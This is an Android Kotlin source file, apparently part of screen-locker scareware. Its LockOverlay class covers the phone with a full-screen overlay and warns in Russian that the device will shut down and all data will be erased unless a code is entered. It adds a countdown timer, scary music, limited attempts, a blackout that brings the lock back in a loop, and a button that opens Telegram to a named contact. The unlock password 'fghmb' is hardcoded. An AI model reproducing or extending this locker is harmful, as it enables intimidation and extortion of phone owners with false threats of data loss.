package com.rocket.deadlinelock

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.os.Vibrator
import android.os.VibrationEffect
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

class LockOverlay(private val context: Context) {
    private val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private val handler = Handler(Looper.getMainLooper())
    private val music = ScaryMusic()

    private var view: LinearLayout? = null
    private var timerText: TextView? = null
    private var attemptsText: TextView? = null
    private var input: EditText? = null
    private var btn: Button? = null

    private val correctPin = "fghmb"
    private var attemptsLeft = 5
    private var secondsLeft = 5 * 60
    private var lockedOut = false

    private val tick = object : Runnable {
        override fun run() {
            if (lockedOut) return
            secondsLeft--
            if (secondsLeft <= 0) {
                timerText?.text = "ВРЕМЯ ВЫШЛО"
                goBlackout()
                return
            }
            timerText?.text = String.format("ОСТАЛОСЬ: %02d:%02d",
                secondsLeft / 60, secondsLeft % 60)
            handler.postDelayed(this, 1000)
        }
    }

    fun show() {
        if (view != null) return
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#080000"))
            setPadding(48, 48, 48, 48)
        }

        val title = TextView(context).apply {
            text = "ТЕЛЕФОН ЗАБЛОКИРОВАН"
            setTextColor(Color.parseColor("#FF1A1A"))
            textSize = 26f; gravity = Gravity.CENTER
        }

        val warn = TextView(context).apply {
            text = "ЕСЛИ НЕ ВВЕСТИ КОД,\nТЕЛЕФОН ОТКЛЮЧИТСЯ\nИ ВСЕ ДАННЫЕ СТЁРТЫ"
            setTextColor(Color.parseColor("#FF6666"))
            textSize = 15f; gravity = Gravity.CENTER
            setPadding(0, 12, 0, 12)
        }

        val tgBtn = Button(context).apply {
            text = "Telegram @qwerty112005"
            setOnClickListener {
                if (!AppLauncher.openTelegram(context))
                    attemptsText?.text = "Telegram не найден"
            }
        }

        val vpnBtn = Button(context).apply {
            text = "Открыть VPN"
            setOnClickListener {
                if (!AppLauncher.openVpn(context))
                    attemptsText?.text = "VPN не найден"
            }
        }

        timerText = TextView(context).apply {
            text = "ОСТАЛОСЬ: 05:00"
            setTextColor(Color.parseColor("#FFAA00"))
            textSize = 24f; gravity = Gravity.CENTER
            setPadding(0, 12, 0, 12)
        }

        attemptsText = TextView(context).apply {
            text = "ПОПЫТОК: 5"
            setTextColor(Color.parseColor("#CCCCCC"))
            textSize = 17f; gravity = Gravity.CENTER
            setPadding(0, 0, 0, 12)
        }

        input = EditText(context).apply {
            hint = "Введите пароль"
            setTextColor(Color.WHITE); setHintTextColor(Color.GRAY)
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }

        btn = Button(context).apply {
            text = "ПРОВЕРИТЬ"
            setOnClickListener { checkPassword() }
        }

        root.addView(title); root.addView(warn)
        root.addView(tgBtn); root.addView(vpnBtn)
        root.addView(timerText); root.addView(attemptsText)
        root.addView(input); root.addView(btn)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        )
        wm.addView(root, params)
        view = root

        music.start()
        handler.postDelayed(tick, 1000)
    }

    private fun checkPassword() {
        if (lockedOut) return
        if (input?.text.toString() == correctPin) unlock()
        else {
            attemptsLeft--
            attemptsText?.text = "ПОПЫТОК: $attemptsLeft"
            input?.setText("")
            vibrate(400)
            if (attemptsLeft <= 0) {
                attemptsText?.text = "ПОПЫТКИ ИСЧЕРПАНЫ"
                goBlackout()
            }
        }
    }

    private fun goBlackout() {
        if (lockedOut) return
        lockedOut = true
        handler.removeCallbacksAndMessages(null)
        music.stop()
        vibrate(1500)
        hide()
        BlackoutOverlay(context).start {
            attemptsLeft = 5
            lockedOut = false
            secondsLeft = 5 * 60
            show()
        }
    }

    private fun unlock() {
        handler.removeCallbacksAndMessages(null)
        music.stop()
        hide()
    }

    fun hide() {
        view?.let { try { wm.removeView(it) } catch (_: Exception) {} }
        view = null
    }

    private fun vibrate(ms: Long) {
        val v = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator ?: return
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
        else @Suppress("DEPRECATION") v.vibrate(ms)
    }
}
